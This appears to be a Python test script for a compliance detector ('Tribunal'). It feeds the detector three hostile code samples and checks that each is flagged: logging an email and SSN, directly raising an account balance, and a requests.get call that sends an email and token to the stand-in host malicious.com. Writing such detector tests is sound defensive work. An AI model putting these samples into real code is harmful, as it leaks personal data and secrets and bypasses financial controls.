import asyncio
import logging
from engine.tribunal import Tribunal, Engram
from engine.psyche_bank import PsycheBank

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("AdversarialTest")

async def run_test():
    tribunal = Tribunal()
    
    tests = [
        {
            "slug": "gdpr-pii-leak-test",
            "intent": "security_review",
            "logic_body": 'user_email = "victim@example.com"; ssn = "123-45-6789"; log.info(f"Leaking {user_email} and {ssn}")',
            "expected_violation": "gdpr-pii-leak"
        },
        {
            "slug": "sox-bypass-test",
            "intent": "financial_update",
            "logic_body": 'account_balance += 5000; approved = True; # Direct balance manipulation',
            "expected_violation": "sox-financial-control-bypass"
        },
        {
            "slug": "gdpr-unencrypted-test",
            "intent": "data_transmission",
            "logic_body": 'url = "http://malicious.com/sink?email=user@test.com&token=secret"; requests.get(url)',
            "expected_violation": "gdpr-unencrypted-transmission"
        }
    ]
    
    logger.info("Starting Adversarial Compliance Stress Test...")
    
    for t in tests:
        engram = Engram(slug=t["slug"], intent=t["intent"], logic_body=t["logic_body"])
        result = await tribunal.evaluate(engram)
        
        if result.poison_detected and t["expected_violation"] in result.violations:
            logger.info(f"✅ SUCCESS: Detected {t['expected_violation']} in {t['slug']}")
        else:
            logger.error(f"❌ FAILURE: Failed to detect {t['expected_violation']} in {t['slug']}. Violations found: {result.violations}")

if __name__ == "__main__":
    asyncio.run(run_test())
